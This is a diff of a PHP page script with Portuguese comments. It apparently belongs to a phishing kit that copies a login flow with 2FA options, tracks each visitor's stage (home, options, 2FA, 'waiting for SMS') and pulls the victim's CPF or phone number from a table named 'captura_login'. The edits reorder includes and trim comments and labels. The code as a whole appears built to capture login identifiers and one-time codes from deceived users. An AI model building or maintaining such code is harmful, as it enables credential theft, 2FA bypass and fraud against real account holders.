@@ -1,9 +1,6 @@
 <?php
-// Inicia a sessão
-
 // =========================================================================
 // PASSO 1: INICIALIZADOR DE SESSÃO (GARANTE QUE O COOKIE SEMPRE EXISTA)
-// Este bloco DEVE ser o primeiro código a ser executado.
 // =========================================================================
 session_start();
 
@@ -11,27 +8,31 @@ $cookie_name = 'identificador_cliente';
 $cookie_lifetime = time() + 3600; // Cookie dura 1 hora
 
 if (!isset($_COOKIE[$cookie_name])) {
-    // Se o cookie NÃO existe, este código o cria com um ID único.
-    $session_value = uniqid('sess_', true); 
+    $session_value = uniqid('sess_', true);
     setcookie($cookie_name, $session_value, $cookie_lifetime, "/");
-    $_COOKIE[$cookie_name] = $session_value; // Disponibiliza para o script atual
+    $_COOKIE[$cookie_name] = $session_value;
 }
-// A partir daqui, o cookie 'identificador_cliente' está 100% garantido.
 
 // =========================================================================
-// PASSO 2: RASTREADOR DE STATUS (AGORA PODE USAR O COOKIE COM SEGURANÇA)
+// PASSO 2: CONEXÃO COM O BANCO DE DADOS
+// Deve ser incluído ANTES de qualquer script que precise do $pdo.
+// =========================================================================
+require_once __DIR__ . '/db.php';
+
+// =========================================================================
+// PASSO 3: RASTREADOR DE STATUS
+// Agora ele pode usar o $pdo do db.php com segurança.
 // =========================================================================
 require_once __DIR__ . '/status_tracker.php';
 
-// Mapa de nomes de arquivos para mensagens de status amigáveis.
 $status_map = [
     'index.php' => 'Na Home (Desktop)',
     'login-mobile.php' => 'Na Home (Mobile)',
-    'senha.php' => 'Tela de opcões para entrar(QRCODE/FACIAL/SMS/WHATSAPP/EMAIL) (Desktop)',
-    'senha-mobile.php' => 'Tela de opcões para entrar(QRCODE/FACIAL/SMS/WHATSAPP/EMAIL) (Mobile)',
+    'senha.php' => 'Tela de Opções (Desktop)',
+    'senha-mobile.php' => 'Tela de Opções (Mobile)',
     'dois_fatores.php' => 'Tela 2FA Mensagem (Desktop)',
-    'dois_fatores2.php' => 'Tela 2FA - Opções de verificação (Desktop)',
-    'doisfatores2mobile.php' => 'Tela 2FA - Opções Opções de verificação (Mobile)',
+    'dois_fatores2.php' => 'Tela 2FA - Opções (Desktop)',
+    'doisfatores2mobile.php' => 'Tela 2FA - Opções (Mobile)',
     'sms_desktop.php' => 'Aguardando SMS (Desktop)',
     'sms_mobile.php' => 'Aguardando SMS (Mobile)',
     'sms_whats_desktop.php' => 'Aguardando SMS via WhatsApp (Desktop)',
@@ -54,28 +55,20 @@ if (isset($status_map[$current_page])) {
 }
 
 // =========================================================================
-// PASSO 3: LÓGICA ESPECÍFICA DA PÁGINA (EXECUTA NORMALMENTE)
+// PASSO 4: LÓGICA ESPECÍFICA DA PÁGINA
 // =========================================================================
-require_once __DIR__ . '/db.php'; // Inclui a conexão com o banco de dados
-
-// Prepara variáveis com valores padrão
 $identificador_label = 'Não identificado';
 $identificador_puro = '';
 $tipo_identificador = '';
 $email_mascarado = 'seu e-mail';
 
-// Agora podemos usar o cookie sem medo, pois ele foi garantido no Passo 1.
 $session_id = $_COOKIE['identificador_cliente'];
 
 try {
-    // Busca o identificador mais recente para esta sessão
-    $stmt = $pdo->prepare(
-        "SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
-    );
+    $stmt = $pdo->prepare("SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1");
     $stmt->execute([$session_id]);
     $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
 
-    // Se um resultado for encontrado, formata os dados para exibição
     if ($resultado && !empty($resultado['identificador'])) {
         $identificador_puro = $resultado['identificador'];
         $numeros_identificador = preg_replace('/\D/', '', $identificador_puro);
@@ -93,8 +86,6 @@ try {
             $identificador_label = ($tipo_identificador === 'cpf' ? 'CPF: ' : 'Telefone: ') . htmlspecialchars($identificador_puro);
         }
     } else {
-        // Se mesmo com um cookie válido não acharmos o registro, algo está errado.
-        // Redirecionar para o início é uma boa medida de segurança.
         header('Location: index.php');
         exit;
     }
